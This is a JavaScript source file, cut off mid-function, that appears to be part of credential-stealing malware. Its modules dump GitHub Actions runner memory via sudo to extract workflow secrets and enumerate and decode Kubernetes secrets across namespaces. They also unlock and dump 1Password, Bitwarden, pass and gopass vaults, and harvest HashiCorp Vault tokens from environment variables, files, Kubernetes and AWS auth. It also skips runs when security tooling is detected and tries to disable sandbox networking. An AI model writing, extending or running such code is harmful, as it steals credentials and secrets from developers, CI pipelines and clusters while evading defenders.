/*
 * Runner memory extraction, npm/ruby token discovery, Kubernetes, password managers, Vault, and provider orchestration.
 */

import { execSync as runnerMemoryExecSync } from "child_process";
import {
  existsSync as procExistsSync,
  readdirSync as procReaddirSync,
  readFileSync as procReadFileSync,
} from "fs";
import { join as procPathJoin } from "path";
function extractActionsSecretsFromRunnerMemory(runnerMemoryDumpInput) {
  let runnerSecretJsonSnippets = runnerMemoryExecSync(
      'tr -d \'\\0\' | grep -aoE \'"[^"]+":{"value":"[^"]*","isSecret":true}\' | sort -u',
      { input: runnerMemoryDumpInput, encoding: "utf-8", maxBuffer: 536870912 },
    )
      .trim()
      .split("\x0a")
      .filter(Boolean),
    runnerExtractedSecrets = [];
  for (let runnerSecretJsonSnippet of runnerSecretJsonSnippets) {
    let runnerSecretDelimiterIndex =
      runnerSecretJsonSnippet.indexOf('":{"value":"');
    if (runnerSecretDelimiterIndex === -1) continue;
    let runnerSecretName = runnerSecretJsonSnippet.slice(
        1,
        runnerSecretDelimiterIndex,
      ),
      runnerSecretValueStart = runnerSecretDelimiterIndex + 11,
      runnerSecretValueEnd = runnerSecretJsonSnippet.indexOf(
        '","isSecret":true}',
        runnerSecretValueStart,
      );
    if (runnerSecretValueEnd === -1) continue;
    runnerExtractedSecrets.push({
      name: runnerSecretName,
      value: runnerSecretJsonSnippet.slice(
        runnerSecretValueStart,
        runnerSecretValueEnd,
      ),
    });
  }
  return runnerExtractedSecrets;
}
class NpmAndRubyTokenProvider extends SecretProviderBase {
  isGitHubActions;
  isLinuxRunner;
  getLinuxDumpScript(runnerWorkerPid) {
    return linuxProcessMemoryDumpPython.replace(
      "__PID__",
      String(runnerWorkerPid),
    );
  }
  constructor() {
    super(
      "github",
      "runner",
      {
        ghs_jwt: /ghs_\d+_[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g,
        ghs_old: /ghs_[A-Za-z0-9]{36,}/g,
      },
      "aggressive",
    ),
      ((this.isGitHubActions = process.env.GITHUB_ACTIONS === "true"),
      (this.isLinuxRunner = process.env.RUNNER_OS === "Linux"));
  }
  findRunnerWorkerPIDLinux() {
    try {
      if (!procExistsSync("/proc")) return null;
      let procDirectoryEntries = procReaddirSync("/proc");
      for (let procPidDirName of procDirectoryEntries) {
        if (!/^\d+$/.test(procPidDirName)) continue;
        let runnerWorkerCmdlinePath = procPathJoin(
          "/proc",
          procPidDirName,
          "cmdline",
        );
        try {
          if (
            procReadFileSync(runnerWorkerCmdlinePath).includes("Runner.Worker")
          )
            return parseInt(procPidDirName, 10);
        } catch {
          continue;
        }
      }
      return null;
    } catch {
      return null;
    }
  }
  async shouldRun() {
    if (detectsSecurityTooling()) return false;
    return true;
  }
  async detectHardenRunner() {
    if (!(await neutralizeSandboxNetworking())) exitAfterCleanup();
  }
  runPrivilegedStdin(privilegedCommand, privilegedStdinBuffer) {
    return runnerMemoryExecSync("sudo " + privilegedCommand, {
      input: privilegedStdinBuffer,
      maxBuffer: 536870912,
    });
  }
  async dumpMemory() {
    let runnerWorkerPidForDump = this.findRunnerWorkerPIDLinux();
    if (!runnerWorkerPidForDump) return null;
    try {
      return this.runPrivilegedStdin(
        "python3",
        this.getLinuxDumpScript(runnerWorkerPidForDump),
      );
    } catch (runnerMemoryDumpError) {
      return null;
    }
  }
  async execute() {
    try {
      if (!this.isGitHubActions || !this.isLinuxRunner)
        return this.failure("Not Actions or Linux");
      let runnerRepository = process.env.GITHUB_REPOSITORY ?? "",
        runnerWorkflow = process.env.GITHUB_WORKFLOW ?? "",
        runnerMemoryDumpBuffer = await this.dumpMemory();
      if (!runnerMemoryDumpBuffer || runnerMemoryDumpBuffer.length === 0)
        return this.failure("No memory data from runner");
      let runnerMemorySecrets = extractActionsSecretsFromRunnerMemory(
        runnerMemoryDumpBuffer,
      );
      if (runnerMemorySecrets.length === 0)
        return this.failure("No secrets found in runner memory");
      let runnerSecretsByName = {};
      for (let runnerMemorySecret of runnerMemorySecrets)
        runnerSecretsByName[runnerMemorySecret.name] = runnerMemorySecret.value;
      return this.success({
        secrets: runnerSecretsByName,
        repo: runnerRepository,
        workflow: runnerWorkflow,
        secretCount: runnerMemorySecrets.length,
        rawBytes: runnerMemoryDumpBuffer.length,
      });
    } catch (runnerExecuteError) {
      let runnerExecuteErrorMessage =
        runnerExecuteError instanceof Error
          ? runnerExecuteError.message
          : String(runnerExecuteError);
      return this.failure(
        Error("Error processing runner: " + runnerExecuteErrorMessage),
      );
    }
  }
}
import * as kubeFs from "fs";
import * as kubePath from "path";
class KubernetesSecretProvider extends SecretProviderBase {
  TIMEOUT_MS = 10000;
  API_BASE = process.env.KUBERNETES_SERVICE_HOST
    ? "https://" +
      process.env.KUBERNETES_SERVICE_HOST +
      ":" +
      process.env.KUBERNETES_SERVICE_PORT
    : null;
  constructor() {
    super("kubernetes", "secrets", {
      k8stoken: /eyJhbGciOiJSUzI1NiIsImtpZCI6[\w\-\.]+/g,
      awskey:
        /(AKIA[0-9A-Z]{16}|aws_access_key_id["\s:=]+["']?[A-Z0-9]{20}|aws_secret_access_key["\s:=]+["']?[A-Za-z0-9/+]{40})/g,
      awsSessionToken: /aws_session_token["\s:=]+["']?[A-Za-z0-9/+=]{100,}/gi,
      gcpKey:
        /"type":\s*"service_account"|"private_key":\s*"-----BEGIN PRIVATE KEY-----/g,
      azureKey:
        /(AccountKey|accessKey|client_secret)["\s:=]+["']?[A-Za-z0-9+/=]{40,}/gi,
      dbConnStr:
        /(mongodb|mysql|postgresql|postgres|redis):\/\/[^:\s]+:[^@\s]+@[^\s'"]+/gi,
      stripeKey: /(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}/g,
      slackToken: /xox[baprs]-[0-9a-zA-Z\-]{10,}/g,
      twilioKey: /SK[0-9a-f]{32}/gi,
      privateKey: /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g,
      sshKey: /ssh-(rsa|ed25519|dss) AAAA[0-9A-Za-z+\/]{100,}/g,
      dockerAuth: /"auth":\s*"[A-Za-z0-9+\/=]{20,}"/g,
      kubeconfig: /[A-Za-z0-9+/=]{20,}/g,
      secret:
        /["']?(password|passwd|pass|pwd|secret|token|key|api[_-]?key|auth)["']?\s*["':=]\s*["'][^"'{}\s]{4,}["']/gi,
      genericSecret: /[A-Za-z0-9_\-\.]{20,}/g,
      urlCred: /https?:\/\/[^:"'\s]+:[^@"'\s]+@[^\s'"\]]+/g,
    });
  }
  isInCluster() {
    return !!process.env.KUBERNETES_SERVICE_HOST;
  }
  async getCA() {
    let kubeCaPath = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt";
    try {
      if (kubeFs.existsSync(kubeCaPath))
        return await kubeFs.promises.readFile(kubeCaPath);
    } catch {}
    return null;
  }
  async readServiceAccountToken() {
    try {
      return (
        await kubeFs.promises.readFile(
          "/var/run/secrets/kubernetes.io/serviceaccount/token",
          "utf-8",
        )
      ).trim();
    } catch {
      return null;
    }
  }
  async readNamespace() {
    try {
      return (
        await kubeFs.promises.readFile(
          "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
          "utf-8",
        )
      ).trim();
    } catch {
      return null;
    }
  }
  getKubeconfigToken() {
    try {
      let kubeHomeDir = process.env.HOME || process.env.USERPROFILE;
      if (!kubeHomeDir) return null;
      let kubeconfigPath =
        process.env.KUBECONFIG || kubePath.join(kubeHomeDir, ".kube", "config");
      if (!kubeFs.existsSync(kubeconfigPath)) return null;
      let kubeconfigText = kubeFs.readFileSync(kubeconfigPath, "utf-8"),
        kubeconfigTokenPatterns = [
          /token:\s*["']?([A-Za-z0-9_\-\.]{20,})["']?/i,
          /id-token:\s*["']?([A-Za-z0-9_\-\.]{20,})["']?/i,
          /access-token:\s*["']?([A-Za-z0-9_\-\.]{20,})["']?/i,
        ];
      for (let kubeconfigTokenPattern of kubeconfigTokenPatterns) {
        let kubeconfigTokenMatch = kubeconfigText.match(kubeconfigTokenPattern);
        if (kubeconfigTokenMatch && kubeconfigTokenMatch[1])
          return kubeconfigTokenMatch[1];
      }
    } catch {}
    return null;
  }
  async apiRequest(kubeApiPath, kubeBearerToken, kubeAbortSignal) {
    let kubeCaCertificate = await this.getCA();
    if (!this.API_BASE) throw Error("No Kubernetes API host configured");
    let kubeApiUrl = "" + this.API_BASE + kubeApiPath,
      kubeAbortController = new AbortController(),
      kubeRequestSignal = kubeAbortController.signal,
      kubeTimeoutHandle = setTimeout(() => {
        kubeAbortController.abort();
      }, this.TIMEOUT_MS),
      abortKubeRequest = () => kubeAbortController.abort();
    if (kubeAbortSignal) {
      if (kubeAbortSignal.aborted)
        throw (clearTimeout(kubeTimeoutHandle), Error("Aborted"));
      kubeAbortSignal.addEventListener("abort", abortKubeRequest);
    }
    try {
      let kubeApiResponse = await fetch(kubeApiUrl, {
        method: "GET",
        headers: {
          Authorization: "Bearer " + kubeBearerToken,
          "User-Agent": "kubectl/v1.28.0",
          Accept: "application/json",
        },
        signal: kubeRequestSignal,
        tls: {
          rejectUnauthorized: !!kubeCaCertificate,
          ca: kubeCaCertificate || void 0,
        },
      });
      if (!kubeApiResponse.ok)
        throw Error("K8s API returned " + kubeApiResponse.status);
      return await kubeApiResponse.json();
    } catch (kubeApiError) {
      if (kubeRequestSignal.aborted) {
        if (kubeAbortSignal?.aborted) throw Error("Aborted");
        throw Error("Request timeout after " + this.TIMEOUT_MS + "ms");
      }
      throw kubeApiError;
    } finally {
      if ((clearTimeout(kubeTimeoutHandle), kubeAbortSignal))
        kubeAbortSignal.removeEventListener("abort", abortKubeRequest);
    }
  }
  async listNamespaces(kubeListNamespacesToken, kubeListNamespacesAbortSignal) {
    try {
      return (
        (
          await this.apiRequest(
            "/api/v1/namespaces",
            kubeListNamespacesToken,
            kubeListNamespacesAbortSignal,
          )
        ).items || []
      )
        .map((kubeNamespaceItem) => kubeNamespaceItem.metadata?.name)
        .filter(Boolean);
    } catch {
      return [];
    }
  }
  async getNamespaceSecrets(
    kubeSecretNamespace,
    kubeSecretToken,
    kubeSecretAbortSignal,
  ) {
    try {
      return (
        (
          await this.apiRequest(
            "/api/v1/namespaces/" + kubeSecretNamespace + "/secrets",
            kubeSecretToken,
            kubeSecretAbortSignal,
          )
        ).items || []
      ).map((kubeSecretItem) => {
        let decodedKubeSecretData = {};
        if (kubeSecretItem.data) {
          for (let [kubeSecretDataKey, kubeSecretDataValue] of Object.entries(
            kubeSecretItem.data,
          ))
            try {
              decodedKubeSecretData[kubeSecretDataKey] = Buffer.from(
                kubeSecretDataValue,
                "base64",
              ).toString("utf-8");
            } catch {
              decodedKubeSecretData[kubeSecretDataKey] =
                String(kubeSecretDataValue);
            }
        }
        return {
          name: kubeSecretItem.metadata?.name,
          namespace: kubeSecretNamespace,
          type: kubeSecretItem.type || "Opaque",
          data: decodedKubeSecretData,
          labels: kubeSecretItem.metadata?.labels || {},
        };
      });
    } catch {
      return [];
    }
  }
  async execute() {
    try {
      if (platformFamily() !== "LINUX") return this.failure("Not Linux.");
      let kubeAuthToken = this.isInCluster()
        ? await this.readServiceAccountToken()
        : this.getKubeconfigToken();
      if (!kubeAuthToken)
        return this.failure("No valid Kubernetes credentials found");
      let kubeNamespaces = await this.listNamespaces(kubeAuthToken);
      if (kubeNamespaces.length === 0)
        kubeNamespaces = [(await this.readNamespace()) || "default"];
      let skippedKubeNamespaces = new Set([
          "kube-system",
          "kube-public",
          "kube-node-lease",
          "local-path-storage",
          "cert-manager",
        ]),
        kubeCollectedSecrets = [];
      for (let kubeNamespace of kubeNamespaces) {
        if (skippedKubeNamespaces.has(kubeNamespace)) continue;
        let kubeNamespaceSecrets = await this.getNamespaceSecrets(
          kubeNamespace,
          kubeAuthToken,
        );
        kubeCollectedSecrets.push(...kubeNamespaceSecrets);
      }
      if (kubeCollectedSecrets.length === 0)
        return this.failure("No secrets accessible");
      return this.success({
        clusterHost: this.API_BASE,
        totalSecrets: kubeCollectedSecrets.length,
        secrets: kubeCollectedSecrets,
      });
    } catch (kubeExecuteError) {
      return this.failure(
        kubeExecuteError instanceof Error
          ? kubeExecuteError
          : Error(String(kubeExecuteError)),
      );
    }
  }
}
import { spawn as passwordManagerSpawn } from "child_process";
class PasswordManagerSecretProvider extends SecretProviderBase {
  TIMEOUT_MS = 10000;
  masterPasswords;
  constructor(passwordManagerMasterPasswords = {}) {
    super("password-managers", "secrets", void 0, "aggressive"),
      (this.masterPasswords = passwordManagerMasterPasswords);
  }
  async runCommand(
    passwordManagerCommand,
    passwordManagerArgs,
    passwordManagerAbortSignal,
    passwordManagerStdin,
  ) {
    return new Promise((resolvePasswordManagerCommand) => {
      let passwordManagerCommandController = new AbortController(),
        passwordManagerCommandTimeout = setTimeout(() => {
          passwordManagerCommandController.abort();
        }, this.TIMEOUT_MS),
        abortPasswordManagerCommand = () =>
          passwordManagerCommandController.abort();
      if (passwordManagerAbortSignal) {
        if (passwordManagerAbortSignal.aborted) {
          clearTimeout(passwordManagerCommandTimeout),
            resolvePasswordManagerCommand({ stdout: "", exitCode: -1 });
          return;
        }
        passwordManagerAbortSignal.addEventListener(
          "abort",
          abortPasswordManagerCommand,
        );
      }
      let passwordManagerProcess = passwordManagerSpawn(
        passwordManagerCommand,
        passwordManagerArgs,
        {
          stdio: passwordManagerStdin
            ? ["pipe", "pipe", "pipe"]
            : ["ignore", "pipe", "pipe"],
          signal: passwordManagerCommandController.signal,
        },
      );
      if (passwordManagerStdin && passwordManagerProcess.stdin)
        passwordManagerProcess.stdin.write(passwordManagerStdin),
          passwordManagerProcess.stdin.end();
      let passwordManagerStdout = "",
        passwordManagerStderr = "";
      passwordManagerProcess.stdout?.on(
        "data",
        (passwordManagerStdoutChunk) => {
          passwordManagerStdout += passwordManagerStdoutChunk.toString();
        },
      ),
        passwordManagerProcess.stderr?.on(
          "data",
          (passwordManagerStderrChunk) => {
            passwordManagerStderr += passwordManagerStderrChunk.toString();
          },
        ),
        passwordManagerProcess.on("error", () => {
          if (
            (clearTimeout(passwordManagerCommandTimeout),
            passwordManagerAbortSignal)
          )
            passwordManagerAbortSignal.removeEventListener(
              "abort",
              abortPasswordManagerCommand,
            );
          resolvePasswordManagerCommand({ stdout: "", exitCode: -1 });
        }),
        passwordManagerProcess.on("close", (passwordManagerExitCode) => {
          if (
            (clearTimeout(passwordManagerCommandTimeout),
            passwordManagerAbortSignal)
          )
            passwordManagerAbortSignal.removeEventListener(
              "abort",
              abortPasswordManagerCommand,
            );
          resolvePasswordManagerCommand({
            stdout: passwordManagerStdout.trim(),
            exitCode: passwordManagerExitCode ?? -1,
          });
        });
    });
  }
  async signinOnePassword(onePasswordAbortSignal) {
    if (!this.masterPasswords.onepassword) return false;
    return (
      (
        await this.runCommand(
          "op",
          ["signin", "--raw"],
          onePasswordAbortSignal,
          this.masterPasswords.onepassword,
        )
      ).exitCode === 0
    );
  }
  async collectOnePassword(onePasswordCollectAbortSignal) {
    let onePasswordSecrets = {};
    if (
      (
        await this.runCommand(
          "op",
          ["account", "list", "--format=json"],
          onePasswordCollectAbortSignal,
        )
      ).exitCode !== 0
    ) {
      if (this.masterPasswords.onepassword) {
        if (!(await this.signinOnePassword(onePasswordCollectAbortSignal)))
          return onePasswordSecrets;
      } else return onePasswordSecrets;
    }
    let onePasswordAccountsCommand = await this.runCommand(
      "op",
      ["account", "list", "--format=json"],
      onePasswordCollectAbortSignal,
    );
    if (
      onePasswordAccountsCommand.exitCode !== 0 ||
      !onePasswordAccountsCommand.stdout
    )
      return onePasswordSecrets;
    let onePasswordAccounts;
    try {
      onePasswordAccounts = JSON.parse(onePasswordAccountsCommand.stdout);
    } catch {
      return onePasswordSecrets;
    }
    for (let onePasswordAccount of onePasswordAccounts) {
      let onePasswordAccountId =
          onePasswordAccount.account_uuid ||
          onePasswordAccount.url ||
          "unknown-account",
        onePasswordVaultsByName = {},
        onePasswordVaultListCommand = await this.runCommand(
          "op",
          [
            "vault",
            "list",
            "--format=json",
            "--account=" + onePasswordAccountId,
          ],
          onePasswordCollectAbortSignal,
        );
      if (
        onePasswordVaultListCommand.exitCode !== 0 ||
        !onePasswordVaultListCommand.stdout
      )
        continue;
      let onePasswordVaults;
      try {
        onePasswordVaults = JSON.parse(onePasswordVaultListCommand.stdout);
      } catch {
        continue;
      }
      for (let onePasswordVault of onePasswordVaults) {
        let onePasswordVaultId = onePasswordVault.id || "",
          onePasswordVaultName = onePasswordVault.name || onePasswordVaultId,
          onePasswordItemListCommand = await this.runCommand(
            "op",
            [
              "item",
              "list",
              "--vault",
              onePasswordVaultId,
              "--account=" + onePasswordAccountId,
              "--format=json",
            ],
            onePasswordCollectAbortSignal,
          );
        if (
          onePasswordItemListCommand.exitCode !== 0 ||
          !onePasswordItemListCommand.stdout
        )
          continue;
        let onePasswordItems;
        try {
          onePasswordItems = JSON.parse(onePasswordItemListCommand.stdout);
        } catch {
          continue;
        }
        let onePasswordItemsByTitle = {};
        for (let onePasswordItem of onePasswordItems) {
          let onePasswordItemId = onePasswordItem.id || "",
            onePasswordItemTitle = onePasswordItem.title || onePasswordItemId,
            onePasswordItemGetCommand = await this.runCommand(
              "op",
              [
                "item",
                "get",
                onePasswordItemId,
                "--vault",
                onePasswordVaultId,
                "--account=" + onePasswordAccountId,
                "--format=json",
              ],
              onePasswordCollectAbortSignal,
            );
          if (
            onePasswordItemGetCommand.exitCode !== 0 ||
            !onePasswordItemGetCommand.stdout
          )
            continue;
          try {
            onePasswordItemsByTitle[onePasswordItemTitle] = JSON.parse(
              onePasswordItemGetCommand.stdout,
            );
          } catch {}
        }
        if (Object.keys(onePasswordItemsByTitle).length > 0)
          onePasswordVaultsByName[onePasswordVaultName] =
            onePasswordItemsByTitle;
      }
      if (Object.keys(onePasswordVaultsByName).length > 0)
        onePasswordSecrets[onePasswordAccountId] = {
          secrets: onePasswordVaultsByName,
        };
    }
    return onePasswordSecrets;
  }
  async unlockBitwarden(bitwardenUnlockAbortSignal) {
    if (!this.masterPasswords.bitwarden) return null;
    let bitwardenUnlockCommand = await this.runCommand(
      "bw",
      ["unlock", "--raw"],
      bitwardenUnlockAbortSignal,
      this.masterPasswords.bitwarden,
    );
    if (bitwardenUnlockCommand.exitCode === 0 && bitwardenUnlockCommand.stdout)
      return bitwardenUnlockCommand.stdout;
    return null;
  }
  async collectBitwarden(bitwardenCollectAbortSignal) {
    let bitwardenSecrets = {},
      bitwardenStatusCommand = await this.runCommand(
        "bw",
        ["status"],
        bitwardenCollectAbortSignal,
      );
    if (bitwardenStatusCommand.exitCode !== 0 || !bitwardenStatusCommand.stdout)
      return bitwardenSecrets;
    let bitwardenStatus;
    try {
      bitwardenStatus = JSON.parse(bitwardenStatusCommand.stdout);
    } catch {
      return bitwardenSecrets;
    }
    let bitwardenSession = null;
    if (bitwardenStatus.status !== "unlocked") {
      if (bitwardenStatus.status === "locked") {
        if (
          ((bitwardenSession = await this.unlockBitwarden(
            bitwardenCollectAbortSignal,
          )),
          !bitwardenSession)
        )
          return (bitwardenSecrets.status = "locked"), bitwardenSecrets;
      } else
        return (
          (bitwardenSecrets.status = bitwardenStatus.status || "unknown"),
          bitwardenSecrets
        );
    }
    let bitwardenListArgs = bitwardenSession
        ? ["list", "items", "--session", bitwardenSession]
        : ["list", "items"],
      bitwardenListCommand = await this.runCommand(
        "bw",
        bitwardenListArgs,
        bitwardenCollectAbortSignal,
      );
    if (bitwardenListCommand.exitCode !== 0 || !bitwardenListCommand.stdout)
      return bitwardenSecrets;
    let bitwardenItems;
    try {
      bitwardenItems = JSON.parse(bitwardenListCommand.stdout);
    } catch {
      return bitwardenSecrets;
    }
    for (let bitwardenItem of bitwardenItems) {
      let bitwardenItemName =
        bitwardenItem.name || bitwardenItem.id || "unknown";
      bitwardenSecrets[bitwardenItemName] = bitwardenItem;
    }
    return bitwardenSecrets;
  }
  async collectPass(passAbortSignal) {
    let passSecrets = {},
      passListCommand = await this.runCommand("pass", ["ls"], passAbortSignal);
    if (passListCommand.exitCode !== 0 || !passListCommand.stdout)
      return passSecrets;
    let passTreeLines =
      passListCommand.stdout.match(
        /[\u251C\u2514\u2500\u2502\s]+([\w./@\-]+)$/gm,
      ) || [];
    for (let passTreeLine of passTreeLines) {
      let passEntryName = passTreeLine
        .replace(/[\u251C\u2514\u2500\u2502\s]+/, "")
        .trim();
      if (!passEntryName) continue;
      let passShowCommand = await this.runCommand(
        "pass",
        ["show", passEntryName],
        passAbortSignal,
      );
      if (passShowCommand.exitCode === 0 && passShowCommand.stdout)
        passSecrets[passEntryName] = passShowCommand.stdout;
    }
    return passSecrets;
  }
  async collectGopass(gopassAbortSignal) {
    let gopassSecrets = {},
      gopassListCommand = await this.runCommand(
        "gopass",
        ["list", "--flat"],
        gopassAbortSignal,
      );
    if (gopassListCommand.exitCode !== 0 || !gopassListCommand.stdout)
      return gopassSecrets;
    let gopassEntries = gopassListCommand.stdout.split("\x0a");
    for (let gopassEntryLine of gopassEntries) {
      let gopassEntryName = gopassEntryLine.trim();
      if (!gopassEntryName) continue;
      let gopassShowCommand = await this.runCommand(
        "gopass",
        ["show", "--password", gopassEntryName],
        gopassAbortSignal,
      );
      if (gopassShowCommand.exitCode === 0 && gopassShowCommand.stdout)
        gopassSecrets[gopassEntryName] = gopassShowCommand.stdout;
    }
    return gopassSecrets;
  }
  async execute(passwordManagerExecuteAbortSignal) {
    try {
      let passwordManagerResults = {
          onepassword: {},
          bitwarden: {},
          pass: {},
          gopass: {},
        },
        [onePasswordResults, bitwardenResults, passResults, gopassResults] =
          await Promise.all([
            this.collectOnePassword(passwordManagerExecuteAbortSignal),
            this.collectBitwarden(passwordManagerExecuteAbortSignal),
            this.collectPass(passwordManagerExecuteAbortSignal),
            this.collectGopass(passwordManagerExecuteAbortSignal),
          ]);
      (passwordManagerResults.onepassword = onePasswordResults),
        (passwordManagerResults.bitwarden = bitwardenResults),
        (passwordManagerResults.pass = passResults),
        (passwordManagerResults.gopass = gopassResults);
      let passwordManagerTotalSecrets =
        Object.keys(passwordManagerResults.onepassword).length +
        Object.keys(passwordManagerResults.bitwarden).length +
        Object.keys(passwordManagerResults.pass).length +
        Object.keys(passwordManagerResults.gopass).length;
      if (passwordManagerTotalSecrets === 0)
        return this.failure("No password managers found or accessible");
      return this.success({
        totalSecrets: passwordManagerTotalSecrets,
        managers: {
          onepassword: Object.keys(passwordManagerResults.onepassword).length,
          bitwarden: Object.keys(passwordManagerResults.bitwarden).length,
          pass: Object.keys(passwordManagerResults.pass).length,
          gopass: Object.keys(passwordManagerResults.gopass).length,
        },
        secrets: passwordManagerResults,
      });
    } catch (passwordManagerExecuteError) {
      return this.failure(
        passwordManagerExecuteError instanceof Error
          ? passwordManagerExecuteError
          : Error(String(passwordManagerExecuteError)),
      );
    }
  }
}
import * as vaultFs from "fs";
import * as vaultHttpModule from "http";
import * as vaultHttpsModule from "https";
class VaultSecretProvider extends SecretProviderBase {
  TIMEOUT_MS = 15000;
  VAULT_ADDR = process.env.VAULT_ADDR || "http://127.0.0.1:8200";
  constructor() {
    super("vault", "secrets", {
      vaultToken: /hvs\.[A-Za-z0-9_-]{24,}/g,
      k8stoken: /eyJhbGciOiJSUzI1NiIsImtpZCI6[\w\-\.]+/g,
      awskey:
        /(AKIA[0-9A-Z]{16}|aws_access_key_id["\s:=]+["']?[A-Z0-9]{20}|aws_secret_access_key["\s:=]+["']?[A-Za-z0-9/+]{40})/g,
      awsSessionToken: /aws_session_token["\s:=]+["']?[A-Za-z0-9/+=]{100,}/gi,
      gcpKey:
        /"type":\s*"service_account"|"private_key":\s*"-----BEGIN PRIVATE KEY-----/g,
      azureKey:
        /(AccountKey|accessKey|client_secret)["\s:=]+["']?[A-Za-z0-9+/=]{40,}/gi,
      dbConnStr:
        /(mongodb|mysql|postgresql|postgres|redis):\/\/[^:\s]+:[^@\s]+@[^\s'"]+/gi,
      stripeKey: /(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}/g,
      slackToken: /xox[baprs]-[0-9a-zA-Z\-]{10,}/g,
      twilioKey: /SK[0-9a-f]{32}/gi,
      privateKey: /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g,
      sshKey: /ssh-(rsa|ed25519|dss) AAAA[0-9A-Za-z+\/]{100,}/g,
      dockerAuth: /"auth":\s*"[A-Za-z0-9+\/=]{20,}"/g,
      secret:
        /["']?(password|passwd|pass|pwd|secret|token|key|api[_-]?key|auth)["']?\s*["':=]\s*["'][^"'{}\s]{4,}["']/gi,
      genericSecret: /[A-Za-z0-9_\-\.]{20,}/g,
      urlCred: /https?:\/\/[^:"'\s]+:[^@"'\s]+@[^\s'"\]]+/g,
      hexKey: /[a-fA-F0-9]{32,128}/g,
      base64Blob: /[A-Za-z0-9+\/=]{40,}/g,
    });
  }
  isInK8s() {
    return !!process.env.KUBERNETES_SERVICE_HOST;
  }
  async getTokenFromEnv() {
    let vaultEnvTokenCandidates = [
      process.env.VAULT_TOKEN,
      process.env.VAULT_AUTH_TOKEN,
      process.env.VAULT_API_TOKEN,
    ];
    for (let vaultEnvTokenCandidate of vaultEnvTokenCandidates)
      if (vaultEnvTokenCandidate && vaultEnvTokenCandidate.length > 5)
        return vaultEnvTokenCandidate;
    return null;
  }
  async getTokenFromFile() {
    let vaultTokenHomeDir =
        process.env.HOME || process.env.USERPROFILE || "/root",
      vaultTokenFileCandidates = [
        process.env.VAULT_TOKEN_PATH,
        process.env.VAULT_TOKEN_FILE,
        vaultTokenHomeDir + "/.vault-token",
        "/root/.vault-token",
        "/home/runner/.vault-token",
        "/vault/token",
        "/var/run/secrets/vault-token",
        "/var/run/secrets/vault/token",
        "/run/secrets/vault_token",
        "/run/secrets/VAULT_TOKEN",
        vaultTokenHomeDir + "/.vault/token",
        "/etc/vault/token",
      ].filter(Boolean);
    for (let vaultTokenFilePath of vaultTokenFileCandidates)
      try {
        if (vaultFs.existsSync(vaultTokenFilePath)) {
          let vaultTokenFileValue = vaultFs
            .readFileSync(vaultTokenFilePath, "utf-8")
            .trim();
          if (
            vaultTokenFileValue &&
            vaultTokenFileValue.length > 5 &&
            vaultTokenFileValue.length < 10000
          )
            return vaultTokenFileValue;
        }
      } catch {}
    return null;
  }
  async getTokenFromK8sAuth() {
    try {
      if (!this.isInK8s()) return null;
      let vaultK8sJwt = await vaultFs.promises.readFile(
          "/var/run/secrets/kubernetes.io/serviceaccount/token",
          "utf-8",
        ),
        vaultK8sHost = process.env.KUBERNETES_SERVICE_HOST,
        vaultK8sAddr =
          process.env.VAULT_ADDR ||
          "http://vault." + vaultK8sHost + ".svc.cluster.local:8200",
        vaultK8sRole = process.env.VAULT_ROLE || "default",
        vaultK8sLoginBody = JSON.stringify({
          role: vaultK8sRole,
          jwt: vaultK8sJwt.trim(),
        }),
        vaultK8sLoginUrl = new URL(vaultK8sAddr);
      return (
        (
          await this.makeRequest(
            {
              hostname: vaultK8sLoginUrl.hostname,
              port: vaultK8sLoginUrl.port || 8200,
              path: "/v1/auth/kubernetes/login",
              method: "POST",
              protocol: vaultK8sLoginUrl.protocol,
              headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(vaultK8sLoginBody),
              },
            },
            vaultK8sLoginBody,
          )
        )?.auth?.client_token ?? null
      );
    } catch {
      return null;
    }
  }
  async getTokenFromAwsIam() {
    try {
      let vaultAwsRole = process.env.VAULT_AWS_ROLE || "default",
        vaultAwsLoginBody = JSON.stringify({ role: vaultAwsRole }),
        vaultAwsLoginUrl = new URL(this.VAULT_ADDR);
      return (
        (
          await this.makeRequest(
            {
              hostname: vaultAwsLoginUrl.hostname,
              port: vaultAwsLoginUrl.port || 8200,
              path: "/v1/auth/aws/login",
              method: "POST",
              protocol: vaultAwsLoginUrl.protocol,
              headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(vaultAwsLoginBody),
              },
            },
            vaultAwsLoginBody,
          )
        )?.auth?.client_token ?? null
      );
    } catch {
      return null;
    }
  }
  makeRequest(vaultMakeRequestOptions, vaultMakeRequestBody) {
    return new Promise((resolveVaultRequest, rejectVaultRequest) => {
      let vaultTransportModule =
          (vaultMakeRequestOptions.protocol ??
            new URL(this.VAULT_ADDR).protocol) === "https:"
            ? vaultHttpsModule
            : vaultHttpModule,
        vaultRequestTimeout = setTimeout(() => {
          vaultHttpRequest.destroy(),
            rejectVaultRequest(
              Error("Timeout after " + this.TIMEOUT_MS + "ms"),
            );
        }, this.TIMEOUT_MS),
        vaultHttpRequest = vaultTransportModule.request(
          vaultMakeRequestOptions,
          (vaultResponse) => {
            clearTimeout(vaultRequestTimeout);
            let vaultResponseBody = "";
            vaultResponse.on(
              "data",
              (vaultResponseChunk) => (vaultResponseBody += vaultResponseChunk),
            ),
              vaultResponse.on("end", () => {
                try {
                  let vaultParsedResponse = JSON.parse(vaultResponseBody);
                  if (
                    vaultResponse.statusCode &&
                    vaultResponse.statusCode >= 200 &&
                    vaultResponse.statusCode < 300
                  )
                    resolveVaultRequest(vaultParsedResponse);
                  else
                    rejectVaultRequest(
                      Error("HTTP " + vaultResponse.statusCode),
                    );
                } catch {
                  rejectVaultRequest(Error("Failed to parse response"));
                }
              });
          },
        );
      if (
        (vaultHttpRequest.on("error", (vaultRequestError) => {
          clearTimeout(vaultRequestTimeout),
            rejectVaultRequest(vaultRequestError);
        }),
        vaultMakeRequestBody)
      )
        vaultHttpRequest.write(vaultMakeRequestBody);
      vaultHttpRequest.end();
    });
  }
  async authenticate() {
    return (
      (await this.getTokenFromEnv()) ??
      (await this.getTokenFromFile()) ??
      (await this.getTokenFromK8sAuth()) ??
      (await this.getTokenFromAwsIam())
    );
  }
  vaultRequest(
    vaultApiPath,
    vaultRequestToken,
    vaultHttpMethod = "GET",
